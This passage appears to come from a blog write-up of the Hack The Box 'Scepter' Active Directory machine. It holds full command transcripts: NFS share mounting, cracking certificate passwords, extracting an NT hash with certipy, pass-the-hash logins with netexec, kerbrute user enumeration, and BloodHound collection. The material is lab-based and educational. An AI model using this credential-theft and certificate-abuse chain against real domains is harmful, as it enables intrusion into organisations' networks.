---
title: Scepter Hack The Box | ESC14
description: "And here we go again. It’s Maverick back from the dark shadows, embracing a new write-up for a brand-new machine. Did you miss me? Damn, no again? Alright, fair enough. Life after graduation has been "
pubDate: 2025-07-21
tags:
  - Security Research
  - Red Team
  - ESC14
author: Mohamed Eletrepy (maverick)
readingTime: 32
coverImage: https://cdn-images-1.medium.com/max/800/1*nO2kUySr42PG5Tmm9cLtLw.png
---

---

![](https://cdn-images-1.medium.com/max/800/1*nO2kUySr42PG5Tmm9cLtLw.png)

### Scepter Hack The Box | ESC14

And here we go again. It’s Maverick back from the dark shadows, embracing a new write-up for a brand-new machine. Did you miss me? Damn, no again? Alright, fair enough. Life after graduation has been brutal, draining, and emotionally destructive, **but you’ve always got to remember why you started this journey in the first place**. And that reason? I’ll keep it a secret for now. This time we’re diving into something a little different an Active Directory Certificate Services escalation, ESC14 to be exact. Yup, something spicy. I hope you enjoy this one, and I genuinely want to hear your feedback. I could ramble for hours, but let’s be honest, you’re here for the blood. So buckle up. It’s red teaming time.

![](https://cdn-images-1.medium.com/max/800/1*c06i-jOQ0Zn9Au1oqqR-Jg.png)

#### Nmap

During scanning, I decided to have a little fun. I teamed up with Claude and put together a simple Python script that takes Nmap’s chaotic mess of results and turns it into a clean, readable table. You know the kind that doesn’t melt your eyes. It’s easy to filter, lets me rate ports and services quickly, and gives me a better high-level view of the target surface. Nothing fancy, just practical stuff to keep recon organized and sharp.

```bash
┌──(root㉿kali)-[/home/…/arsenal/nmaper/nmap_5/eagle_eye_results]  
└─# cat eagle_eye_10.10.11.65_default_20250719_130432_raw.txt  
# Nmap 7.95 scan initiated Sat Jul 19 13:04:32 2025 as: /usr/lib/nmap/nmap -sS -sCV -Pn -T4 -p- --min-rate=1000 --max-retries=3 --open --reason --version-intensity=7 -oX eagle_eye_results/eagle_eye_10.10.11.65_default_20250719_130432.xml -oN eagle_eye_results/eagle_eye_10.10.11.65_default_20250719_130432_raw.txt 10.10.11.65  
Warning: 10.10.11.65 giving up on port because retransmission cap hit (3).  
Nmap scan report for 10.10.11.65  
Host is up, received user-set (0.14s latency).  
Not shown: 62153 closed tcp ports (reset), 3353 filtered tcp ports (no-response)  
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit  
PORT STATE SERVICE REASON VERSION  
53/tcp open domain syn-ack ttl 127 Simple DNS Plus  
88/tcp open kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-07-20 01:05:31Z)  
111/tcp open rpcbind syn-ack ttl 127 2-4 (RPC #100000)  
| rpcinfo:  
| program version port/proto service  
| 100000 2,3,4 111/tcp rpcbind  
| 100000 2,3,4 111/tcp6 rpcbind  
| 100000 2,3,4 111/udp rpcbind  
| 100000 2,3,4 111/udp6 rpcbind  
| 100003 2,3 2049/udp nfs  
| 100003 2,3 2049/udp6 nfs  
| 100003 2,3,4 2049/tcp nfs  
| 100003 2,3,4 2049/tcp6 nfs  
| 100005 1,2,3 2049/tcp mountd  
| 100005 1,2,3 2049/tcp6 mountd  
| 100005 1,2,3 2049/udp mountd  
| 100005 1,2,3 2049/udp6 mountd  
| 100021 1,2,3,4 2049/tcp nlockmgr  
| 100021 1,2,3,4 2049/tcp6 nlockmgr  
| 100021 1,2,3,4 2049/udp nlockmgr  
| 100021 1,2,3,4 2049/udp6 nlockmgr  
| 100024 1 2049/tcp status  
| 100024 1 2049/tcp6 status  
| 100024 1 2049/udp status  
|_ 100024 1 2049/udp6 status  
135/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC  
139/tcp open netbios-ssn syn-ack ttl 127 Microsoft Windows netbios-ssn  
445/tcp open microsoft-ds? syn-ack ttl 127  
464/tcp open kpasswd5? syn-ack ttl 127  
593/tcp open ncacn_http syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0  
636/tcp open ssl/ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: scepter.htb0., Site: Default-First-Site-Name)  
| ssl-cert: Subject: commonName=dc01.scepter.htb  
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.scepter.htb  
| Not valid before: 2024-11-01T03:22:33  
|_Not valid after: 2025-11-01T03:22:33  
|_ssl-date: 2025-07-20T01:07:10+00:00; +8h00m01s from scanner time.  
2049/tcp open nlockmgr syn-ack ttl 127 1-4 (RPC #100021)  
3268/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: scepter.htb0., Site: Default-First-Site-Name)  
| ssl-cert: Subject: commonName=dc01.scepter.htb  
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.scepter.htb  
| Not valid before: 2024-11-01T03:22:33  
|_Not valid after: 2025-11-01T03:22:33  
|_ssl-date: 2025-07-20T01:07:11+00:00; +8h00m01s from scanner time.  
3269/tcp open ssl/ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: scepter.htb0., Site: Default-First-Site-Name)  
|_ssl-date: 2025-07-20T01:07:10+00:00; +8h00m00s from scanner time.  
| ssl-cert: Subject: commonName=dc01.scepter.htb  
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.scepter.htb  
| Not valid before: 2024-11-01T03:22:33  
|_Not valid after: 2025-11-01T03:22:33  
5985/tcp open http syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
|_http-title: Not Found  
5986/tcp open ssl/http syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
|_ssl-date: 2025-07-20T01:07:10+00:00; +8h00m01s from scanner time.  
| ssl-cert: Subject: commonName=dc01.scepter.htb  
| Subject Alternative Name: DNS:dc01.scepter.htb  
| Not valid before: 2024-11-01T00:21:41  
|_Not valid after: 2025-11-01T00:41:41  
|_http-title: Not Found  
| tls-alpn:  
|_ http/1.1  
9389/tcp open mc-nmf syn-ack ttl 127 .NET Message Framing  
47001/tcp open http syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
|_http-title: Not Found  
49664/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC  
49665/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC  
49666/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC  
49667/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC  
49673/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC  
49690/tcp open ncacn_http syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0  
49691/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC  
49693/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC  
49694/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC  
49707/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC  
49722/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC  
49728/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC  
49764/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC  
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows  
  
Host script results:  
|_clock-skew: mean: 8h00m00s, deviation: 0s, median: 8h00m00s  
| smb2-time:  
| date: 2025-07-20T01:06:25  
|_ start_date: N/A  
| smb2-security-mode:  
| 3:1:1:  
|_ Message signing enabled and required  
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
# Nmap done at Sat Jul 19 13:07:10 2025 -- 1 IP address (1 host up) scanned in 157.90 seconds
```

![](https://cdn-images-1.medium.com/max/1200/1*1vcEs-WGx-qdInrsMyB9ag.png)

*Looks good, right? Perfect table*

There are the usual Domain Controller services running here, nothing too surprising. But the most interesting service during enumeration is NFS yeah, the same one we saw in the Cicada machine. Let’s take a look at what it’s exposing using `showmount`, and then we’ll mount everything and see what kind of goodies are hiding

```bash
┌──(root㉿kali)-[/home/…/Desktop/htb/scepter/files]  
└─# showmount -e scepter.htb  
Export list for scepter.htb:  
/helpdesk (everyone)
```

So, let’s make a directory and mount the `helpdesk` share onto it. Time to see what secrets the sysadmins forgot to hide.

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/scepter]  
└─# mkdir mountfiles  
  
┌──(root㉿kali)-[/home/kali/Desktop/htb/scepter]  
└─# cd mountfiles  
  
┌──(root㉿kali)-[/home/kali/Desktop/htb/scepter]  
└─# mount -t nfs scepter.htb:/helpdesk ./mountfiles  
┌──(root㉿kali)-[/home/…/Desktop/htb/scepter/mountfiles]  
└─# ls  
baker.crt baker.key clark.pfx lewis.pfx scott.pfx
```

Hmm, looks like at first glance it’s full of certificates. Let’s dig deeper and see what’s hidden inside them using `OpenSSL` because you know nothing good gets left unencrypted… or does it?

![](https://cdn-images-1.medium.com/max/800/1*aoDcMiwq8xPVipuRCpuvTw.png)

As you can see, we can’t view the contents of most of these certificates they’re password-protected. So yeah, no other option here… time to crack them open and see what secrets they’re hiding. But in the case of the last user, *baker*, we’ve got both a `.crt` and a `.key` file. The `.key` is encrypted, but the `.crt` contains some basic metadata nothing too fancy, just an email:` d.baker@scepter.htb.` Make sure to remember that we’re definitely going to need it later.

![](https://cdn-images-1.medium.com/max/800/1*ry7sqzgSt1nVxP5H8h1SuQ.png)

#### Secrets in the Certs

I’m going to throw all three users’ certificate files into a single file and crack them together. And if you’re wondering, “Wait this time you’re using John?” Yeah, I usually love Hashcat, but let’s be real John supports way more formats out of the box, including `.pfx`, which Hashcat doesn’t handle. So John it is.

```bash
┌──(root㉿kali)-[/home/…/Desktop/htb/scepter/files]  
└─# pfx2john clark.pfx lewis.pfx scott.pfx > pfx.hashes
```

```bash
┌──(root㉿kali)-[/home/…/Desktop/htb/scepter/files]  
└─# john pfx.hashes --wordlist=/usr/share/wordlists/rockyou.txt  
Using default input encoding: UTF-8  
Loaded 3 password hashes with 3 different salts (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 128/128 SSE2 4x])  
Cost 1 (iteration count) is 2048 for all loaded hashes  
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 256 for all loaded hashes  
Will run 4 OpenMP threads  
Press 'q' or Ctrl-C to abort, almost any other key for status  
newpassword (lewis.pfx)  
newpassword (clark.pfx)  
newpassword (scott.pfx)  
3g 0:00:00:00 DONE (2025-07-19 13:57) 3.030g/s 5171p/s 15515c/s 15515C/s Liverpool..babygrl  
Use the "--show" option to display all of the cracked passwords reliably  
Session completed.  
┌──(root㉿kali)-[/home/…/Desktop/htb/scepter/files]  
└─# john pfx.hashes --show  
clark.pfx:newpassword:::::clark.pfx  
lewis.pfx:newpassword:::::lewis.pfx  
scott.pfx:newpassword:::::scott.pfx  
  
3 password hashes cracked, 0 left
```

As you can see, all three users are using the same password `newpassword`. Damn. So now we’re only left with the last user, ***baker***. I’ll extract the hash from the encrypted key using `pem2john`, then try cracking it and see if we can finally break through.

![](https://cdn-images-1.medium.com/max/800/1*AGjRdMXRZqmdgqFEpqMryw.png)

![](https://cdn-images-1.medium.com/max/800/1*LaC-vbLQMvnXqhfcORckag.png)

![](https://cdn-images-1.medium.com/max/800/1*Qy7O2nAjaKp8XJyv7jRKJw.png)

After generating the hash and throwing it at John damn, no luck. So I did some digging into Hashcat’s hash formats and found out there are two variants: one with `$1` and another with `$2`. The hash I had was using `$1`, so I swapped it out for `$2`… and *voilà *it cracked! But guess what? Same damn password as the other users: `newpassword`. Seriously? What a letdown.

![](https://cdn-images-1.medium.com/max/800/0*Y8DJbauC76SD1zZR.gif)

*Damn… same password?? Seriously?*

So now that we’ve got the password for all the certificates, it’s time to dig in and see what’s been hiding inside them all along. Let’s crack them open and hope there’s more than just disappointment this time.

![](https://cdn-images-1.medium.com/max/800/1*3X1zJid8DzhDyQkNpeC5Eg.png)

*clark user*

![](https://cdn-images-1.medium.com/max/800/1*s83nKLiP9sJCbt2mKYSCuQ.png)

*Lewis User*

![](https://cdn-images-1.medium.com/max/800/1*kZ0a00c5FBXUR-SoBpy2PA.png)

*scott user*

**Umm… but I wanna see more data here? Hmm.**
 You can do the same thing with the other `.pfx` files to see what’s hidden inside. You’ll find stuff like the user’s email and their UPN definitely useful later.

![](https://cdn-images-1.medium.com/max/800/1*3Imt4RnidLCSro-mppBY4g.png)

![](https://cdn-images-1.medium.com/max/800/1*_e-BWbZQhTfN30IB0gtCJg.png)

So now we’ve got all the certificates along with their password. I think it’s time to check if we can use them for authentication. But there’s one problem there’s no `.pfx` file for the *baker* user. No worries though, I’ll just create one myself.

```bash
┌──(root㉿kali)-[/home/…/Desktop/htb/scepter/files]  
└─# openssl pkcs12 -export -inkey baker.key -in baker.crt -out d.baker.pfx  
Enter pass phrase for baker.key:  
Enter Export Password:  
Verifying - Enter Export Password:
```

![](https://cdn-images-1.medium.com/max/800/1*-7Dbqxgt9K4eRIa4sISjxA.png)

```bash
┌──(root㉿kali)-[/home/…/Desktop/htb/scepter/files]  
└─# certipy auth -pfx clark.pfx -password newpassword -dc-ip 10.10.11.65  
Certipy v5.0.2 - by Oliver Lyak (ly4k)  
  
[*] Certificate identities:  
[*] SAN UPN: 'm.clark@scepter.htb'  
[*] Security Extension SID: 'S-1-5-21-74879546-916818434-740295365-2103'  
[*] Using principal: 'm.clark@scepter.htb'  
[*] Trying to get TGT...  
[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)  
[-] Use -debug to print a stacktrace  
[-] See the wiki for more information  
  
┌──(root㉿kali)-[/home/…/Desktop/htb/scepter/files]  
└─# certipy -debug auth -pfx clark.pfx -password newpassword -dc-ip 10.10.11.65  
Certipy v5.0.2 - by Oliver Lyak (ly4k)  
  
[+] Target name (-target) and DC host (-dc-host) not specified. Using domain '' as target name. This might fail for cross-realm operations  
[+] Nameserver: '10.10.11.65'  
[+] DC IP: '10.10.11.65'  
[+] DC Host: ''  
[+] Target IP: '10.10.11.65'  
[+] Remote Name: '10.10.11.65'  
[+] Domain: ''  
[+] Username: ''  
[*] Certificate identities:  
[*] SAN UPN: 'm.clark@scepter.htb'  
[*] Security Extension SID: 'S-1-5-21-74879546-916818434-740295365-2103'  
[+] Found SID in security extension: 'S-1-5-21-74879546-916818434-740295365-2103'  
[*] Using principal: 'm.clark@scepter.htb'  
[*] Trying to get TGT...  
[+] Sending AS-REQ to KDC scepter.htb (10.10.11.65)  
[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)  
Traceback (most recent call last):  
File "/root/.local/share/uv/tools/certipy-ad/lib/python3.13/site-packages/certipy/commands/auth.py", line 596, in kerberos_authentication  
tgt = sendReceive(as_req, domain, self.target.target_ip)  
File "/root/.local/share/uv/tools/certipy-ad/lib/python3.13/site-packages/impacket/krb5/kerberosv5.py", line 93, in sendReceive  
raise krbError  
impacket.krb5.kerberosv5.KerberosError: Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)  
[-] See the wiki for more information
```

When I tried authenticating with all of the users, I kept getting Kerberos errors except for the `d.baker` user of baker. And you know why? Because the others are **locked out**, baby. That’s exactly why, whenever you gather usernames from anywhere, you should always validate them first using tools like **kerbrute** or anything similar. And if you’re wondering, *“Where did you even get these users from?”* well, straight from those **damn certificates**, bruh.

```bash
┌──(root㉿kali)-[/home/…/Desktop/htb/scepter/certs]  
└─# kerbrute userenum users -v --dc 10.10.11.65 -d scepter.htb  
  
__ __ __  
/ /_____ _____/ /_ _______ __/ /____  
/ //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \  
/ ,< / __/ / / /_/ / / / /_/ / /_/ __/  
/_/|_|\___/_/ /_.___/_/ \__,_/\__/\___/  
  
Version: dev (n/a) - 07/21/25 - Ronnie Flathers @ropnop  
  
2025/07/21 02:46:32 > Using KDC(s):  
2025/07/21 02:46:32 > 10.10.11.65:88  
  
2025/07/21 02:46:32 > [+] VALID USERNAME: d.baker@scepter.htb  
2025/07/21 02:46:32 > [+] VALID USERNAME: a.carter@scepter.htb  
2025/07/21 02:46:32 > [!] e.lewis@scepter.htb - USER LOCKED OUT  
2025/07/21 02:46:32 > [+] VALID USERNAME: p.adams@scepter.htb  
2025/07/21 02:46:32 > [+] VALID USERNAME: h.brown@scepter.htb  
2025/07/21 02:46:32 > [!] M.clark@scepter.htb - USER LOCKED OUT  
2025/07/21 02:46:32 > [!] o.scott@scepter.htb - USER LOCKED OUT  
2025/07/21 02:46:32 > Done! Tested 7 usernames (4 valid) in 0.133 seconds
```

But when I tried logging in as **d.baker** *boom*, it worked. Logged in without a hitch. And if you’re wondering where I got **p.admam**, **h.brown**, and **a.carter** from don’t worry, you’ll find out in the next steps. Oh, and yeah, I ran **kerbrute** in the last machine just to *demonstrate the lockout effect* for you. See? I got your back even when I’m trolling the domain.

```bash
┌──(root㉿kali)-[/home/…/Desktop/htb/scepter/files]  
└─# ntpdate 10.10.11.65|certipy -debug auth -pfx d.baker.pfx -domain scepter.htb -dc-ip 10.10.11.65  
Certipy v5.0.2 - by Oliver Lyak (ly4k)  
  
[+] Target name (-target) and DC host (-dc-host) not specified. Using domain '' as target name. This might fail for cross-realm operations  
[+] Nameserver: '10.10.11.65'  
[+] DC IP: '10.10.11.65'  
[+] DC Host: ''  
[+] Target IP: '10.10.11.65'  
[+] Remote Name: '10.10.11.65'  
[+] Domain: ''  
[+] Username: ''  
[*] Certificate identities:  
[*] SAN UPN: 'd.baker@scepter.htb'  
[*] Security Extension SID: 'S-1-5-21-74879546-916818434-740295365-1106'  
[+] Found SID in security extension: 'S-1-5-21-74879546-916818434-740295365-1106'  
[*] Using principal: 'd.baker@scepter.htb'  
[*] Trying to get TGT...  
[+] Sending AS-REQ to KDC scepter.htb (10.10.11.65)  
[*] Got TGT  
[*] Saving credential cache to 'd.baker.ccache'  
[+] Attempting to write data to 'd.baker.ccache'  
File 'd.baker.ccache' already exists. Overwrite? (y/n - saying no will save with a unique filename): [+] Using alternative filename: 'd.baker_c4b7c5a0-83c9-4720-90d0-fe7cbd5453d5.ccache'  
[+] Data written to 'd.baker_c4b7c5a0-83c9-4720-90d0-fe7cbd5453d5.ccache'  
[*] Wrote credential cache to 'd.baker_c4b7c5a0-83c9-4720-90d0-fe7cbd5453d5.ccache'  
[*] Trying to retrieve NT hash for 'd.baker'  
[*] Got hash for 'd.baker@scepter.htb': aad3b435b51404eeaad3b435b51404ee:18b5fb0d99e7a475316213c15b6f22ce
```

Alright, now that we’ve got the hash for **d.baker**, it’s time to validate it across different services and see where it actually works. Let’s test it against SMB, LDAP, and WinRM because creds without access are just fancy souvenirs.

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/scepter/files]  
└─# nxc smb scepter.htb -u d.baker -H 18b5fb0d99e7a475316213c15b6f22ce  
  
SMB 10.10.11.65 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:scepter.htb) (signing:True) (SMBv1:False)  
SMB 10.10.11.65 445 DC01 [+] scepter.htb\d.baker:18b5fb0d99e7a475316213c15b6f22ce  
  
┌──(root㉿kali)-[/home/kali/Desktop/htb/scepter/files]  
└─# nxc ldap scepter.htb -u d.baker -H 18b5fb0d99e7a475316213c15b6f22ce  
  
LDAP 10.10.11.65 389 DC01 [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:scepter.htb) (signing:None) (channel binding:Never)  
LDAP 10.10.11.65 389 DC01 [+] scepter.htb\d.baker:18b5fb0d99e7a475316213c15b6f22ce  
  
┌──(root㉿kali)-[/home/kali/Desktop/htb/scepter/files]  
└─# nxc winrm scepter.htb -u d.baker -H 18b5fb0d99e7a475316213c15b6f22ce  
  
WINRM 10.10.11.65 5985 DC01 [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:scepter.htb)  
WINRM 10.10.11.65 5985 DC01 [-] scepter.htb\d.baker:18b5fb0d99e7a475316213c15b6f22ce
```

Alright, here we go. And if you’re wondering, *“Where did you get those other users from in the Kerbrute output?”* the answer is simple: **NetExec**. It revealed them during enumeration, and I fed those straight into Kerbrute for validation. You’ll see it all unfold in the next steps.

```bash
┌──(root㉿kali)-[/home/…/Desktop/htb/scepter/certs]  
└─# nxc smb scepter.htb -u d.baker -H 18b5fb0d99e7a475316213c15b6f22ce --users-export users  
SMB 10.10.11.65 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:scepter.htb) (signing:True) (SMBv1:False)  
SMB 10.10.11.65 445 DC01 [+] scepter.htb\d.baker:18b5fb0d99e7a475316213c15b6f22ce  
SMB 10.10.11.65 445 DC01 -Username- -Last PW Set- -BadPW- -Description-  
SMB 10.10.11.65 445 DC01 Administrator 2025-03-07 22:19:11 0 Built-in account for administering the computer/domain  
SMB 10.10.11.65 445 DC01 Guest <never> 0 Built-in account for guest access to the computer/domain  
SMB 10.10.11.65 445 DC01 krbtgt 2024-10-31 22:24:41 0 Key Distribution Center Service Account  
SMB 10.10.11.65 445 DC01 d.baker 2025-07-20 04:06:02 0  
SMB 10.10.11.65 445 DC01 a.carter 2025-07-20 04:06:02 0  
SMB 10.10.11.65 445 DC01 h.brown 2025-03-07 22:19:11 0  
SMB 10.10.11.65 445 DC01 p.adams 2024-11-02 08:00:25 0  
SMB 10.10.11.65 445 DC01 e.lewis 2024-11-02 01:07:14 0  
SMB 10.10.11.65 445 DC01 o.scott 2024-11-02 01:07:14 0  
SMB 10.10.11.65 445 DC01 M.clark 2024-11-02 01:07:14 0  
SMB 10.10.11.65 445 DC01 [*] Enumerated 10 local users: SCEPTER  
SMB 10.10.11.65 445 DC01 [*] Writing 10 local users to users
```

You know what’s next **mapping the domain**. For this, I used both **NetExec**, **rusthound-ce-python**, and **bloodhound-ce-python**. Personally, I prefer **RustHound**, and here’s why: it actually showed the *inbound rights* for the **a.carter** user something I didn’t find in the BloodHound-CE Python version. That’s exactly why you should always try multiple tools during enumeration. Tools have gaps. Bugs exist. And you, as the operator, need to stay sharp and updated because missing one edge case can mean missing your foothold.

**NetExec**

```bash
┌──(root㉿kali)-[/home/…/Desktop/htb/scepter/files]  
└─# nxc ldap scepter.htb -u d.baker -H 18b5fb0d99e7a475316213c15b6f22ce --bloodhound --dns-server 10.10.11.65  
  
LDAP 10.10.11.65 389 DC01 [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:scepter.htb) (signing:None) (channel binding:Never)  
LDAP 10.10.11.65 389 DC01 [+] scepter.htb\d.baker:18b5fb0d99e7a475316213c15b6f22ce  
LDAP 10.10.11.65 389 DC01 Resolved collection methods: group, session, trusts, localadmin  
LDAP 10.10.11.65 389 DC01 Done in 0M 11S  
LDAP 10.10.11.65 389 DC01 Compressing output into /root/.nxc/logs/DC01_10.10.11.65_2025-07-20_234805_bloodhound.zip
```

**Bloodhound-ce-python**

```bash
┌──(root㉿kali)-[/home/…/Desktop/htb/scepter/certs]  
└─# bloodhound-ce-python -d scepter.htb -dc dc01.scepter.htb -u 'd.baker' --hashes :18b5fb0d99e7a475316213c15b6f22ce -c All --zip -ns 10.10.11.65  
INFO: BloodHound.py for BloodHound Community Edition  
INFO: Found AD domain: scepter.htb  
INFO: Getting TGT for user  
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)  
INFO: Connecting to LDAP server: dc01.scepter.htb  
INFO: Found 1 domains  
INFO: Found 1 domains in the forest  
INFO: Found 1 computers  
INFO: Connecting to LDAP server: dc01.scepter.htb  
INFO: Found 11 users  
INFO: Found 57 groups  
INFO: Found 2 gpos  
INFO: Found 3 ous  
INFO: Found 19 containers  
INFO: Found 0 trusts  
INFO: Starting computer enumeration with 10 workers  
INFO: Querying computer: dc01.scepter.htb  
┌──(root㉿kali)-[/home/kali/Desktop/htb/scepter]  
└─# dnschef --fakeip 127.0.0.1  
/usr/bin/dnschef:453: SyntaxWarning: invalid escape sequence '\/'  
header += " / _` | '_ \/ __|/ __| '_ \ / _ \ _|\n"  
/usr/bin/dnschef:454: SyntaxWarning: invalid escape sequence '\_'  
header += " | (_| | | | \__ \ (__| | | | __/ | \n"  
/usr/bin/dnschef:455: SyntaxWarning: invalid escape sequence '\_'  
header += " \__,_|_| |_|___/\___|_| |_|\___|_| \n"  
_ _ __  
| | version 0.4 | | / _|  
__| |_ __ ___ ___| |__ ___| |_  
/ _` | '_ \/ __|/ __| '_ \ / _ \ _|  
| (_| | | | \__ \ (__| | | | __/ |  
\__,_|_| |_|___/\___|_| |_|\___|_|  
iphelix@thesprawl.org  
  
(15:34:52) [*] DNSChef started on interface: 127.0.0.1  
(15:34:52) [*] Using the following nameservers: 8.8.8.8  
(15:34:52) [*] Cooking all A replies to point to 127.0.0.1  
^C(15:37:16) [*] DNSChef is shutting down.
```

**Rusthound-ce**

```bash
┌──(root㉿kali)-[/home/…/Desktop/htb/scepter/files]  
└─# KRB5CCNAME=d.baker.ccache rusthound-ce -k -c All -d scepter.htb -f dc01.scepter.htb -z  
---------------------------------------------------  
Initializing RustHound-CE at 23:46:16 on 07/20/25  
Powered by @g0h4n_0  
Special thanks to NH-RED-TEAM  
---------------------------------------------------  
  
[2025-07-21T03:46:16Z INFO rusthound_ce] Verbosity level: Info  
[2025-07-21T03:46:16Z INFO rusthound_ce] Collection method: All  
[2025-07-21T03:46:17Z INFO rusthound_ce::ldap] Connected to SCEPTER.HTB Active Directory!  
[2025-07-21T03:46:17Z INFO rusthound_ce::ldap] Starting data collection...  
[2025-07-21T03:46:17Z INFO rusthound_ce::ldap] Ldap filter : (objectClass=*)  
[2025-07-21T03:46:18Z INFO rusthound_ce::ldap] All data collected for NamingContext DC=scepter,DC=htb  
[2025-07-21T03:46:18Z INFO rusthound_ce::ldap] Ldap filter : (objectClass=*)  
[2025-07-21T03:46:20Z INFO rusthound_ce::ldap] All data collected for NamingContext CN=Configuration,DC=scepter,DC=htb  
[2025-07-21T03:46:20Z INFO rusthound_ce::ldap] Ldap filter : (objectClass=*)  
[2025-07-21T03:46:21Z INFO rusthound_ce::ldap] All data collected for NamingContext CN=Schema,CN=Configuration,DC=scepter,DC=htb  
[2025-07-21T03:46:21Z INFO rusthound_ce::ldap] Ldap filter : (objectClass=*)  
[2025-07-21T03:46:21Z INFO rusthound_ce::ldap] All data collected for NamingContext DC=DomainDnsZones,DC=scepter,DC=htb  
[2025-07-21T03:46:21Z INFO rusthound_ce::ldap] Ldap filter : (objectClass=*)  
[2025-07-21T03:46:21Z INFO rusthound_ce::ldap] All data collected for NamingContext DC=ForestDnsZones,DC=scepter,DC=htb  
[2025-07-21T03:46:21Z INFO rusthound_ce::json::parser] Starting the LDAP objects parsing...  
⠈ Parsing LDAP objects: 11%  
[2025-07-21T03:46:22Z INFO rusthound_ce::objects::enterpriseca] Found 13 enabled certificate templates  
[2025-07-21T03:46:22Z INFO rusthound_ce::json::parser] Parsing LDAP objects finished!  
[2025-07-21T03:46:22Z INFO rusthound_ce::json::checker] Starting checker to replace some values...  
[2025-07-21T03:46:22Z INFO rusthound_ce::json::checker] Checking and replacing some values finished!  
[2025-07-21T03:46:22Z INFO rusthound_ce::json::maker::common] 11 users parsed!  
[2025-07-21T03:46:22Z INFO rusthound_ce::json::maker::common] 65 groups parsed!  
[2025-07-21T03:46:22Z INFO rusthound_ce::json::maker::common] 1 computers parsed!  
[2025-07-21T03:46:22Z INFO rusthound_ce::json::maker::common] 3 ous parsed!  
[2025-07-21T03:46:22Z INFO rusthound_ce::json::maker::common] 3 domains parsed!  
[2025-07-21T03:46:22Z INFO rusthound_ce::json::maker::common] 2 gpos parsed!  
[2025-07-21T03:46:22Z INFO rusthound_ce::json::maker::common] 74 containers parsed!  
[2025-07-21T03:46:22Z INFO rusthound_ce::json::maker::common] 1 ntauthstores parsed!  
[2025-07-21T03:46:22Z INFO rusthound_ce::json::maker::common] 1 aiacas parsed!  
[2025-07-21T03:46:22Z INFO rusthound_ce::json::maker::common] 1 rootcas parsed!  
[2025-07-21T03:46:22Z INFO rusthound_ce::json::maker::common] 1 enterprisecas parsed!  
[2025-07-21T03:46:22Z INFO rusthound_ce::json::maker::common] 35 certtemplates parsed!  
[2025-07-21T03:46:22Z INFO rusthound_ce::json::maker::common] 3 issuancepolicies parsed!  
[2025-07-21T03:46:22Z INFO rusthound_ce::json::maker::common] .//20250720234622_scepter-htb_rusthound-ce.zip created!
```

As the first step, I marked **d.baker** as an owned user and checked the **shortest paths from owned objects**. That’s when things started to get interesting. Let’s see what kind of access this user actually brings to the table and whether it’s enough to start pivoting deeper into the domain.

![](https://cdn-images-1.medium.com/max/1200/1*Xw9ClnfqODIbZ5oCsQnp_g.png)

![](https://cdn-images-1.medium.com/max/1200/1*vDUEUf-8OTx3pFl7608yGQ.png)

As you can see in the first BloodHound graph, **d.baker** has `ForceChangePassword` over **a.carter**. And guess what? **a.carter** is a member of the **Support** group, which has `GenericAll` over the **Staff Access Certificates** OU. So yeah this smells like potential. When I enumerated the **Staff Access Certificate** templates, it only included **d.baker** as an authorized user. So before anything else, let’s assess the potential here by checking for **vulnerable certificate templates** using **Certipy**.

```bash
┌──(root㉿kali)-[/home/…/Desktop/htb/scepter/certs]  
└─# certipy find -vulnerable -u d.baker -hashes :18b5fb0d99e7a475316213c15b6f22ce -dc-ip 10.10.11.65 -stdout  
Certipy v5.0.2 - by Oliver Lyak (ly4k)  
  
[*] Finding certificate templates  
[*] Found 35 certificate templates  
[*] Finding certificate authorities  
[*] Found 1 certificate authority  
[*] Found 13 enabled certificate templates  
[*] Finding issuance policies  
[*] Found 20 issuance policies  
[*] Found 0 OIDs linked to templates  
[*] Retrieving CA configuration for 'scepter-DC01-CA' via RRP  
[!] Failed to connect to remote registry. Service should be starting now. Trying again...  
